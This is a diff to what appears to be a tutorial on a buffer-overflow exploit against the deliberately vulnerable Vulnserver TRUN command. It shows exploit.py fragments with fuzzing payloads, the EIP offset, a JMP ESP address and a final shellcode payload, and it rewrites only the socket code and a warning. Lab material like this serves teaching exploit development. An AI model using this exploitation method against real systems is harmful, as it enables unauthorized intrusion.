@@ -30,8 +30,8 @@ only will have access to the binary and we must start doing thinks like
 recognizance, enumeration and fuzzing.
 
 
-*WARNING:*
-Do NOT run `vulnserver.exe` on a sensitive machine or on a non-secure network.
+WARNING: Do NOT run `vulnserver.exe` on a sensitive machine or on 
+a non-secure network.
 It will be a backdoor that may be used by others to break into your system.
 
 == Enumerating Vulnserver
@@ -99,8 +99,7 @@ PAYLOAD = (
     b'A' * 5000
 )
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as fd:
-    fd.connect((HOST, PORT))
+with socket.create_connection((HOST, PORT)) as fd:
     fd.sendall(PAYLOAD)
 ----
 
@@ -151,8 +150,7 @@ PAYLOAD = (
     b'<paste pattern here>'
 )
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as fd:
-    fd.connect((HOST, PORT))
+with socket.create_connection((HOST, PORT)) as fd:
     fd.sendall(PAYLOAD)
 ----
 
@@ -162,9 +160,10 @@ image::trun6.gif[Exploit: take 2]
 
 image::trun7.png[Cyclic pattern on EIP]
 
-As you can see, the EIP register now holds the value `386F4337`. We can check
-the exact offset of that string on our unique cyclic pattern.
-To do that, we can use `Metasploit`:
+As you can see, the EIP register now holds the value `386F4337`. 
+Given that we have a cyclic pattern, we can check the exact 
+offset of that string.
+To do that, we can use `Metasploit` again:
 
 image::pattern2.png[Pattern offset]
 
@@ -186,8 +185,7 @@ PAYLOAD = (
     b'C' * (5000 - 2003 - 4)
 )
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as fd:
-    fd.connect((HOST, PORT))
+with socket.create_connection((HOST, PORT)) as fd:
     fd.sendall(PAYLOAD)
 ----
 
@@ -252,8 +250,8 @@ modules, by running:
 image::esp1.png[JMP ESP instructions]
 
 As you can see, there are several `JMP ESP` instructions we can pick. We
-are going to pick the one at `62501205`. Let's update the exploit and replace
-the four `B` with that address:
+are going to pick the one at `62501205`. 
+Let's update the exploit and replace the four `B` with that address:
 
 .exploit.py
 [source,python]
@@ -272,8 +270,7 @@ PAYLOAD = (
     b'C' * (5000 - 2003 - 4)
 )
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as fd:
-    fd.connect((HOST, PORT))
+with socket.create_connection((HOST, PORT)) as fd:
     fd.sendall(PAYLOAD)
 ----
 
@@ -352,8 +349,7 @@ PAYLOAD = (
     b'C' * (5000 - 2003 - 4 - 32 - len(SHELL))
 )
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as fd:
-    fd.connect((HOST, PORT))
+with socket.create_connection((HOST, PORT)) as fd:
     fd.sendall(PAYLOAD)
 ----
 
